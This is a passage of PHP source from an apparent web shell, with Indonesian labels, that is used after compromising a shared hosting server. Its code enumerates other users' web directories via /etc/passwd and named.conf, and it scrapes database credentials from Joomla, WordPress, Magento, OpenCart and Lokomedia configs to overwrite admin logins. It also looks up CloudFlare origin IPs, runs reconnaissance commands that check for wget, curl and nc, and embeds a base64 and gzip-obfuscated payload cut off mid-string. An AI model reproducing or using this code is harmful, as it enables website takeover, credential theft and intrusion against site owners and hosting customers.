        $urls = explode("\r\n", $_POST['url']);
        if(isset($_POST['jump'])) {
            echo "<pre>";
            foreach($urls as $url) {
                $web_vh = "/var/www/vhosts/$url/httpdocs";
                if(is_dir($web_vh) === true) {
                    if(is_readable($web_vh)) {
                        $i++;
                        $jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
                        if(is_writable($web_vh)) {
                            $jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
                        }
                        echo $jrw."<br>";
                    }
                }
            }
        if($i == 0) {
        } else {
            echo "<br>Total ada ".$i." Kamar di ".$ip;
        }
        echo "</pre>";
        } else {
            echo '<center>
                  <form method="post">
                  List Domains: <br>
                  <textarea name="url" style="width: 500px; height: 250px;">';
                  bing("ip:$ip");
            echo  '</textarea><br>
                  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
                  </form></center>';
        }
    } else {
        echo "<pre>";
        $etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
        while($passwd = fgets($etc)) {
            if($passwd == '' || !$etc) {
                echo "<font color=red>Can't read /etc/passwd</font>";
            } else {
                preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
                foreach($user_jumping[1] as $user_idx_jump) {
                    $user_jumping_dir = "/home/$user_idx_jump/public_html";
                    if(is_readable($user_jumping_dir)) {
                        $i++;
                        $jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
                        if(is_writable($user_jumping_dir)) {
                            $jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
                        }
                        echo $jrw;
                        if(function_exists('posix_getpwuid')) {
                            $domain_jump = file_get_contents("/etc/named.conf");
                            if($domain_jump == '') {
                                echo " => ( <font color=red>Gabisa ambil nama domain nya</font> )<br>";
                            } else {
                                preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                                foreach($domains_jump[1] as $dj) {
                                    $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                    $user_jumping_url = $user_jumping_url['name'];
                                    if($user_jumping_url == $user_idx_jump) {
                                        echo " => ( <u>$dj</u> )<br>";
                                        break;
                                    }
                                }
                            }
                        } else {
                            echo "<br>";
                        }
                    }
                }
            }
        }
        if($i == 0) {
        } else {
            echo "<br>Total ada ".$i." Kamar di ".$ip;
        }
        echo "</pre>";
    }
    echo "</div>";
} elseif($_GET['do'] == 'auto_edit_user') {
    if($_POST['hajar']) {
        if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
            echo "username atau password harus lebih dari 6 karakter";
        } else {
            $user_baru = $_POST['user_baru'];
            $pass_baru = md5($_POST['pass_baru']);
            $conf = $_POST['config_dir'];
            $scan_conf = scandir($conf);
            foreach($scan_conf as $file_conf) {
                if(!is_file("$conf/$file_conf")) continue;
                $config = file_get_contents("$conf/$file_conf");
                if(preg_match("/JConfig|joomla/",$config)) {
                    $dbhost = ambilkata($config,"host = '","'");
                    $dbuser = ambilkata($config,"user = '","'");
                    $dbpass = ambilkata($config,"password = '","'");
                    $dbname = ambilkata($config,"db = '","'");
                    $dbprefix = ambilkata($config,"dbprefix = '","'");
                    $prefix = $dbprefix."users";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result['id'];
                    $site = ambilkata($config,"sitename = '","'");
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Joomla<br>";
                    if($site == '') {
                        echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
                    } else {
                        echo "Sitename => $site<br>";
                    }
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/WordPress/",$config)) {
                    $dbhost = ambilkata($config,"DB_HOST', '","'");
                    $dbuser = ambilkata($config,"DB_USER', '","'");
                    $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                    $dbname = ambilkata($config,"DB_NAME', '","'");
                    $dbprefix = ambilkata($config,"table_prefix  = '","'");
                    $prefix = $dbprefix."users";
                    $option = $dbprefix."options";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[ID];
                    $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                    $result2 = mysql_fetch_array($q2);
                    $target = $result2[option_value];
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Wordpress<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/Magento|Mage_Core/",$config)) {
                    $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
                    $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
                    $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
                    $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
                    $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
                    $prefix = $dbprefix."admin_user";
                    $option = $dbprefix."core_config_data";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[user_id];
                    $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
                    $result2 = mysql_fetch_array($q2);
                    $target = $result2[value];
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Magento<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
                    $dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
                    $dbuser = ambilkata($config,"'DB_USERNAME', '","'");
                    $dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
                    $dbname = ambilkata($config,"'DB_DATABASE', '","'");
                    $dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
                    $prefix = $dbprefix."user";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[user_id];
                    $target = ambilkata($config,"HTTP_SERVER', '","'");
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => OpenCart<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
                    $dbhost = ambilkata($config,'server = "','"');
                    $dbuser = ambilkata($config,'username = "','"');
                    $dbpass = ambilkata($config,'password = "','"');
                    $dbname = ambilkata($config,'database = "','"');
                    $prefix = "users";
                    $option = "identitas";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
                    $result = mysql_fetch_array($q);
                    $target = $result[alamat_website];
                    if($target == '') {
                        $target2 = $result[url];
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                        if($target2 == '') {
                            $url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                        } else {
                            $cek_login3 = file_get_contents("$target2/adminweb/");
                            $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
                            if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
                                $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
                            } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
                                $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
                            } else {
                                $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
                            }
                        }
                    } else {
                        $cek_login = file_get_contents("$target/adminweb/");
                        $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
                        if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
                            $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
                        } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
                            $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
                        } else {
                            $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
                        }
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Lokomedia<br>";
                    if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
                        echo $url_target2;
                    } else {
                        echo $url_target;
                    }
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                }
            }
        }
    } else {
        echo "<center>
        <h1>Auto Edit User Config</h1>
        <form method='post'>
        DIR Config: <br>
        <input type='text' size='50' name='config_dir' value='$dir'><br><br>
        Set User & Pass: <br>
        <input type='text' name='user_baru' value='kzel' placeholder='user_baru'><br>
        <input type='text' name='pass_baru' value='kzel' placeholder='pass_baru'><br>
        <input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
        </form>
        <span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
        ";
    }
}
elseif($_GET['do'] == 'pou') {
echo '
<form method="POST"><br><br>
<center><p align="center" dir="ltr"><b><font size="5" face="Tahoma">+--=[ Bypass
<font color="#CC0000">CloudFlare </font> ]=--+</font></b></p>
<select class="inputz" name="krz">
    <option>ftp</option>
        <option>direct-conntect</option>
            <option>webmail</option>
                <option>cpanel</option>
</select>
<input class="inputz" type="text" name="target" value="url">
<input class="inputzbut" type="submit" value="Bypass"></center>

';
    $target = $_POST['target'];
    # Bypass From FTP
    if ($_POST['krz'] == "ftp") {
        $ftp = gethostbyname("ftp." . "$target");
        echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$ftp</font></p>";
    }
    # Bypass From Direct-Connect
    if ($_POST['krz'] == "direct-conntect") {
        $direct = gethostbyname("direct-connect." . "$target");
        echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$direct</font></p>";
    }
    # Bypass From Webmail
    if ($_POST['krz'] == "webmail") {
        $web = gethostbyname("webmail." . "$target");
        echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$web</font></p>";
    }
    # Bypass From Cpanel
    if ($_POST['krz'] == "cpanel") {
        $cpanel = gethostbyname("cpanel." . "$target");
        echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$cpanel</font></p>";
    }
}
elseif($_GET['do'] == 'info') { global $os;
    echo "<div id=result style='color:lime;'>
    <h2>Info Server</h2> <br /><br />
   <br> OS: <a style='color:lime;text-decoration:none;' target=_blank href='http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=".php_uname(s)."'>".php_uname(s)."</td></tr>
   <br> PHP Version : <a style='color:lime;text-decoration:none;' target=_blank href='?phpinfo'>".phpversion().".</td></tr>
   <br> Kernel Release : <font color=lime>".php_uname(r)."</font>
   <br> Kernel Version : <font color=lime>".php_uname(v)."</font>
    <br>Machine : <font color=lime>".php_uname(m)."</font>
    <br>Server Software : <font color=lime>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
    if(function_exists('apache_get_modules'))
    {
    echo "Loaded Apache modules : <br /><br /><font color=>lime";
        echo implode(', ', apache_get_modules());
        echo "</font></tr></td>";
    }
    if($os=='win')
    {
        echo  "Account Setting : <font color=lime><pre>".cmd('net accounts')."</pre>
               User Accounts : <font color=lime><pre>".cmd('net user')."</pre>
               ";
    }
    if($os=='nix')
    {
        echo "Distro : <font color=lime><pre>".cmd('cat /etc/*-release')."</pre></font>
              Distr name : <font color=lime><pre>".cmd('cat /etc/issue.net')."</pre></font>
              GCC : <font color=lime><pre>".cmd('whereis gcc')."</pre>
              PERL : <font color=lime><pre>".cmd('whereis perl')."</pre>
           PYTHON : <font color=lime><pre>".cmd('whereis python')."</pre>
              JAVA : <font color=lime><pre>".cmd('whereis java')."</pre></td></tr>
              APACHE : <font color=lime><pre>".cmd('whereis apache')."</pre></td></tr>
              CPU : <br /><br /><pre><font color=lime>".cmd('cat /proc/cpuinfo')."</font></pre></td></tr>
              RAM : <font color=lime><pre>".cmd('free -m')."</pre></td></tr>
               User Limits : <br /><br /><font color=lime><pre>".cmd('ulimit -a')."</pre></td></tr>";
              $useful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
              $uze=array();
              foreach($useful as $uzeful)
              {
                if(cmd("which $uzeful"))
                {
                    $uze[]=$uzeful;
                }
              }
              echo " Useful : <br /><font color=lime><pre>";
              echo implode(', ',$uze);
              echo "</pre></td></tr>";
              $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
              $uze=array();
              foreach($downloaders as $downloader)
              {
                if(cmd("which $downloader"))
                {
                    $uze[]=$downloader;
                }
              }
              echo " Downloaders : <br /><font color=lime><pre>";
              echo implode(', ',$uze);
              echo "</pre></td></tr>";
              echo " Users : <br /><font color=lime><pre>".wordwrap(get_users())."</pre</font>></td></tr>
                     Hosts : <br /><font color=lime><pre>".cmd('cat /etc/hosts')."</pre></font></td></tr>";
    }
    echo " <br /><br /> <br /><br />";

}
elseif($_GET['do'] == 'hashid') {
if (isset($_POST['gethash'])) {
        $hash = $_POST['hash'];
        if (strlen($hash) == 32) {
            $hashresult = "MD5 Hash";
        } elseif (strlen($hash) == 40) {
            $hashresult = "SHA-1 Hash/ /MySQL5 Hash";
        } elseif (strlen($hash) == 13) {
            $hashresult = "DES(Unix) Hash";
        } elseif (strlen($hash) == 16) {
            $hashresult = "MySQL Hash / /DES(Oracle Hash)";
        } elseif (strlen($hash) == 41) {
            $GetHashChar = substr($hash, 40);
            if ($GetHashChar == "*") {
                $hashresult = "MySQL5 Hash";
            }
        } elseif (strlen($hash) == 64) {
            $hashresult = "SHA-256 Hash";
        } elseif (strlen($hash) == 96) {
            $hashresult = "SHA-384 Hash";
        } elseif (strlen($hash) == 128) {
            $hashresult = "SHA-512 Hash";
        } elseif (strlen($hash) == 34) {
            if (strstr($hash, '$1$')) {
                $hashresult = "MD5(Unix) Hash";
            }
        } elseif (strlen($hash) == 37) {
            if (strstr($hash, '$apr1$')) {
                $hashresult = "MD5(APR) Hash";
            }
        } elseif (strlen($hash) == 34) {
            if (strstr($hash, '$H$')) {
                $hashresult = "MD5(phpBB3) Hash";
            }
        } elseif (strlen($hash) == 34) {
            if (strstr($hash, '$P$')) {
                $hashresult = "MD5(Wordpress) Hash";
            }
        } elseif (strlen($hash) == 39) {
            if (strstr($hash, '$5$')) {
                $hashresult = "SHA-256(Unix) Hash";
            }
        } elseif (strlen($hash) == 39) {
            if (strstr($hash, '$6$')) {
                $hashresult = "SHA-512(Unix) Hash";
            }
        } elseif (strlen($hash) == 24) {
            if (strstr($hash, '==')) {
                $hashresult = "MD5(Base-64) Hash";
            }
        } else {
            $hashresult = "Hash type not found";
        }
    } else {
        $hashresult = "Not Hash Entered";
    }
?>
    <center><br><Br><br>

        <form action="" method="POST">
        <tr>
        <table class="tabnet">
        <th colspan="5">Hash Identification</th>
        <tr class="optionstr"><B><td>Enter Hash</td></b><td>:</td>  <td><input type="text" name="hash" size='60' class="inputz" /></td><td><input type="submit" class="inputzbut" name="gethash" value="Identify Hash" /></td></tr>
        <tr class="optionstr"><b><td>Result</td><td>:</td><td><?php echo $hashresult; ?></td></tr></b>
    </table></tr></form>
    </center>
<?php
} elseif($_GET['do'] == 'base-coc') {
echo'<center><br><br><h1>DataBase SQL
<form method="post" action="">&nbsp;
<select name="pilihan" id="pilih">
<option value="db">DataBase [Mysql Adminer]</option>
<option value="phini">Bypass php.ini</option>
</select>
<input  type="submit" name="submites" value=" >> ">
</td></form><hr>';
//starting
$submit = $_POST ['submites'];
if(isset($submit)) {
    $pilih = $_POST['pilihan'];
//auto deface
    if ( $pilih == 'db') {
        $script = "PD9waHAgZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZU5yTlBXdFhHN21TbjJmT21mK2c5UGltN2NFWW16eXZqWjJRUUdZNFE0QUw1TjZkeFY1djIyNURMM2EzMDkwT01CbisrOVpEcjM2WVFKTGRjK2NCTGFsVUpaV2tVbFdwSkg3NjBZL2pLQjdHL2lLSzB5QThyNzZvZFg3NjhYWGlwOE81ZHg2TWh4K1hVZW9udzNnWnBzSGNyemF4T0JvTms5U0wweW9tS25Nc0VGM2hYeTltMGNTdnVzS3RpM2t3amlPcVVTTWdncGVBWE9Pc05SQnI2cnM1QUtDSlB3MUNxSCt5UFR3K1BEd0ZMRWxLVFp0NVk4anU5eUhIM1lBZmt5QU9QVUE5SEw3YjI5OGREbXUxQnVRam5ZME5oV1R2WlBpdnZRUEdBZjlWajM0N0doNmVBQUxNcllsWG9pWGFvaWxxRmwxZFpXZnZlUGZ0NmVIeEg4T1QzYVB0NDIzNEZOMnV3QmJrNE44ZXZnZjQ4Y3hMa3FGL0hTUnBVblV4YnlXQlg0L2VRb1h6UEh2UEYyUEpxRW1RREtmTGNBeDhRcWp4OUh6NHlZdXJMdVI3bzVsUFpXa1FoVW0rS2REQnZZTjNoNEM5K3NpUC9mT2c2aXd1RmtFNGpaeTZ4bHJMTm96R0dRZGdPQXZtUWNxais5T1AweWoydmZGRjFZdGo3NmJxRG4vZGhjRndoMGVISjZmUU15OFJGUmlWajBzL1NXdmlzd0d2Nkd5R3VmUnZSTGNISDUrODJkSW4wR0FxcWxUd3VYa3JIZ0ZMaDY3T1orNVFVbFlCSGlSRGJvUkNBdTI3aFhLSlhPSG1YUDVQRWhsZmVESDBqc1p0bVU1Zk1wMEwzNXY0Y2RVWlIySHFoK242NmMzQ2I0dlV2MDQzTHRMNXJDTmt0UzVVV1gvcEVEbmh6eEsvZ0hNVW5EOTdJRTZzY2hmSzg5SGxBekZDamJzUXpqeFkwcTBINGd5U2FQM2x5MmQvWDk5MEpMZHgrZnF6S2JIN1pQZjRuN3ZIWnk0dXA1UGQvWGZ1QUNaVWFYYmJ5ajU1ZTd4M2REbzgySDYvNitKS3IrQ2NBNUV3WHdCU2xoSTA4ZVRZVFNLUVJNeGxiM3k1WE14dmtvOHpWengrTEI1VkV1K1Q3eVhUWU1ZVGFqS0NEb1ZRWlhRUkpXbGR3TWN5OFdQNldNQ3FwQThVRnZBaGU4aGxJTzVvdmFXNHFxQVZOTTJHMDFtd3FISWVsY1orc3B3Qk04WEhxblB5MitHL0JCVWx4QmxzNmlNSlVST0xxcnQxc2Rsekc5VFlJWW5WS3NpbHJRM01KV1RZYUd3S29CdDVDWDFXRFk5K096MDlHdjZHUzJ6UWNJZnZiMDcrc2QvQWJtTlZPWGp1V3psNEtRMmV0MWpNZ3JHSDBtQmpHVjZHMFZWWUNyMFRKSXNvQ1JBT0txVXByTlU1NUhlRWFsRFhiZWpHc1VqSFBreTgxSU9tdWk3a1hGMUFNYzZ1SmZUckNuSzVsMU0vSFYrb0ZTbzVvZGR6a0FDekpUUFBaRTBROUFPR3NHZzBZSm5ENTNLK0lOaXFnYTNwaGMzMHhyTW80YmtDd2paVnN4UEp5VW5UN2JxTWwzanhXUTBTVHdHbUN5TXpUODZ4WTBjem1FbStDTUxGTWhVTTR1ckY5RDBtRnhGSHhxcTlRWFo2UnRNMzM1elRDNTlHUk54RVMzSGxoYW5ZZ1Y3TUltOUNVL1FLWkdvWWhZUUpSaS9iMHN4RWhjWHFqMU9CTlllSXNPcmFkR0dLeU9sclppOWdnSG83eDRkSDRuVDd6ZjZ1MkhzbmR2OWo3K1QwUktUenhkQUx6LzBaMXdLd3Q4ZTcyNmU3RWxBWGk2cVVMR0wvOE9EWE4vdUhiOFRCNGFrNCtMQy9YOU5WOXcrM2Q4VE85dWsyQUwzZDNoZXdZY0VHTGx5bjRVMG1DZXlpRjM2T1NRM0hCYWpUd3dLNWQzdTcrenNuNG5UMytQM2VBYlJuUjd6NUE3WVRMaDErTmhMbWR1aEgwK0hRRmJzbmI3ZVBKSndyOXZjT2RoOVNuZnRReG1mVjcya2N6VTBEVlpjdHBtYkxjQnZqdGZSNjlXSXlZaWE2eXMrWGZSaGZuakJURDM1T1JFNzJaQ2NJQXFJeUFEVVhYbnFCbjFsTzMwdk1YSzlMVVlIMXoxellQZnd3Z1FKMzhFMkNoN0Vwb1poQjVteVB4LzRpWGQvM3cvUDBvaTJjQm1oelVMdGFrU0tDcE1INEloSXl3eElPZ3Y3OTZjZFhQUlFTVzdqUDlmQTNZTWJmY3grRXowV2FMdFpCYXdrK2RaMjMxdDdvcUhIdE9pczJYa1NSQnVuTTc3My9BNFQxMWdZbklEZEpiMkJVa0h1eThqaEpFSHdVVFc3cTZlVHpGREMzUld0emNTMjI0OENiMVUrOWkyanVkV2FneTYxZitNSDVCUlkvWDF4M29QRU5razljcDFnRk44anpPRnFHay9iUDArbTBNNHBpNEJyVUJzQWttZ1VUOGZQejU4ODdDMWhmSUI3YlVMOGpDV3h1U3Z3ZWFHOFdlaGk5WlJ6NHNUandyMENaZkIrRlViSUFCZnhyU0NINlVTbytNK2o2T0pwRmNmdm5VUlAvemVCN01zRi9PeEpnU3Y5MFZuUTUxMzVQZk9acTR1ZG1jOXBCZnE5UC9IRVUwNHh0QTNvL1JzWVNiUHNpK3VUSHVzSzAyU3hVUUJuTGZKbWxMUUdqSlJ1ZlJvdTIxVlhEZ2ZWUmxLYlIzQzZjVENaWmRyWHdYODJhWndEWmFzS1BaL3kvSXJmNXZjajlIZis5bTl3MEdpK1Q3MFVQL3ZHOHUrbmhvdnRPNVB5LzQ3K3J5ZUc4V2IvaVdUS0taaE9idm9DNUhINjJJY0lvbm5zemhBRTdadjU1N3NYblFkaHVhdlJOTExyWUxDdFFNL0VwRUxYWExtVVFqU1Q0MDIrM01DbW45ck0zejE4K2Y0Y29sN01HeWVOWllGQkxvS2RQbnhieDJkOVkvWE4rNHBKMm9GQzhlUEdpTXdVTklHM1AvR25hQWZzUHJPaWI5bWdXalM4N1Y4RUVSR25yR1RDdHc3VFhZMEtPYkVUa1d4c2t3a2lXamVOZ2tkckM3SCs4VHg3bm9reFQ5cWg0ZStHUEw3ZG5zeXF5VWRtRlZiQmRSZEJ0ZG9JdHpHN0Fqb2s3UU5LWWtUanZCR3RyQklwZ3FCZG5nTTZDZ2R6Ly9BYnB6V2d3amk4dXZSbG94U0RsRzJNa0NSdWZyTWRGS3BjM0FLdUJsV293SVdLeG55N2pVRXhnQlNDZEJ0alp1MHp5emMzZUJLRjRlOVkxenlPUFBxcndDM1dsU3RWVldXNnR3UjhOTWtTN2tPamtBWkxsQ0kxcmlSVjRTOHhENW02b3JRaDNCa0U4N3pwNk5wQTJ2QTdERmkzVDlqUzRoajZKSzFnazZ5T1EySmR0K3JrT1BlYWRpSlZFSE5tdTAybzIvK1lJWGxCZHB3bDdtVCtieVhtcjB5alZaWm9ReE96SDZEb28rRGhyMHR2QzlhSmF4aE9LcGtySDZaMTRVeCsyaDRuZjNucTF1RmdJMm9TQmwrUHBlZFZOb0hBNGgwSlFOMS8xb00rQUJsSENoaHY3MDY1akpsRmJjOWVkUmVmUVZWUlFlL3YwdWJYaDljU1hhb0VLNDAzbVFVajFWSTBOYlB0R0d1TVA1QXhyQUE5Z1V1dFprVXRiaUMrbEFjTWVTMWZKSEFkUitVcElmK24yck9ISFlaOTdsLzVGZ0w0eGxkdmhxdE1vU3FYdHkzb2VsNHUvL2hMcUU4MWcwMFdjdjQra1FZSUdzZnBFYXo4YWV6Tk1vR253U05vcUVvWStwUzMzU0Zvb3NvZytvZWpKaytaemx6eFFJMndaWm0yeGFjUnJIOW8vOFVOSEJKTXVPaEZDVUgwZFFVcWNTZklhY0ZxTzJPaTVzbGZLRHVTRzFtajlTQkpnK0RrMmpiNGswaWNxZlllcjlDVVpLODEwK2s1RjUyejArcUZEUzk2bWlOMldkdGE5U1dJZG02Uk1XeVJsVGpsSnRBc2ZTaExyMkNSbDJpSXBjMWFRUkhQem9TU2hUb1lrcDIyU25GTk9rc3pwQjVMRU9qWkptYlpJeXB3eWtsTHhmaGhOV2NrUU5SbWFxc25TWkhIZS92QkZWMVRlRThYcmwxMUhtSjVYbFlNQjVHSUV2MUt3NzZuWXJkM2xaVkJPQnVWalVDNEc3V0c0di9kcWl1NjExOU5vZ2VZU1duMTE5OHBWTmlXVTF2S3VBOWZ5Y2JsZjVlUDZmL0FjcmZBVjFRWDJTRHVNcHV3cmtubGtaUzdqR1hxVXJUTUZlZEpRZDkwNjhZZGtkZFhkZ2Zhak1Tb3V2RVFrU3pCQWswVHcrSXMwRW5vN2t0WXI0RzI0RHJBdGh0MnY2d3hITXk4RTh4QktFU2V5eDJQdTVKMVlaZzRBMFRlTW4yMTV0MmE3dEdtNGdoQm1CUXR0L2dSY1BJQ1gvZzEwQ3Qyek1LdmxWMHF1VlJvQjdaN1gxY2c5cjd6elVNZTQ1bFZDNFd3d3FnYW1rWTJTZ01wMmNwNGJySTZaTkRXNUJYVzNrK21HUkl6ZFlHUzFiMXdEOCtySHFyTjNjTEo3Zk1xZUlwNDNwREFxY2pYeHorMzlEN3NuM0VQTWNQQWd4TjFqbm9iK2xZaFJrWjZJYUtvRzNCVnRrWm5udFd4SGxndVk1bjUyUENpRk0rZjVVMmJqdHd4SW50a0kwSEM2OTJlNUdsSEY1TXJWaFI4cjcvUHpwME8wSFVBblVRM3VmUHN3ZkRqYVFkZWdOUUludTZkNld2N3J0OTFqS09SVzdPKzkzenNWTFI2SFkyWStzUlRrN1pkWWI0VHl4SmZDMkdiNkY3dFpnV3ArNmcrUjg3Q0Y3T3p1NzBLcjN4MGZ2cmViYmpmWCtRN011UThaNHNZT3RnNVZ2M3ZQU2NrWGc1UlVPOE9sT0ZxNDM3ck9rRUxXbjJub09UVzE1ZTBBS2Q1QTdHYWJ2VXFlZjdodVR2eXRHRzZvSnB1U3FGMnU2cUordmVOUFBkZ3pZSzdqcVJsay9Qcm1kendlcG1NNVNMN0IzM1Y1OUFmcEQ2ZnYxbDlpaGp3VGc2eDllVHJXS2RQanlaZUhVT1RiRSsrOTBEdjM0eFhhZk4yMlFYNzZFYmZKTVZpVFBsZ0xpNTdLMm5ramZrTk52ZTBxSEtTNTVBMEhIaGxFR2Z5Skdadk51a3ZLQ254ckhWb1N5U0QvZ0NyK0Y1SGpjSzlFenVweUdmSWptQjFmUm81emFDVnlWb3l6eUZmaWtoYUZhekNnVTFsbW9hNkhPV3hYUXdiWnJaZ3pTbDFOWW1NQnRwOGNocUs5OWVwQnZnMS9FcVM4R0tzODVIVXBYT3BDejJwMTJtU1piU2lkakc0SWZab0dNYXlSdlVSRXNRaVNzTyttWXBKZDdLK2dBNElkRlBLTW9PcHl5U3lBYVZGcjBLbzJ6Z2FvMlNrQ2NlTWtGQ2RLb0hUVEphQk9sOEJtZlJpYU1XRGhzOGlvV2tkc2VMS2tr